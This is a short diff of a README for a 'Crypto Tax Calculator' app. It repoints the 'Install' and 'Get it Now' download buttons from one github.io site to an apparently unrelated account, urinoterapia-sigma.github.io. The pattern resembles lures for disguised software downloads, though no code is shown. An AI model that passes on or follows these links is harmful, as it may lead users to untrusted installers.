@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/cryptoTaxCalculator)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/cryptoTaxCalculator)
 
 </div>
 
@@ -81,7 +81,7 @@ Crypto Tax Calculator's DeFi transaction handling is the capability that disting
 
 <p align="center">
 
-[![Get it Now Crypto Tax Calculator](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/cryptoTaxCalculator)
+[![Get it Now Crypto Tax Calculator](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/cryptoTaxCalculator)
 
 </p>
 
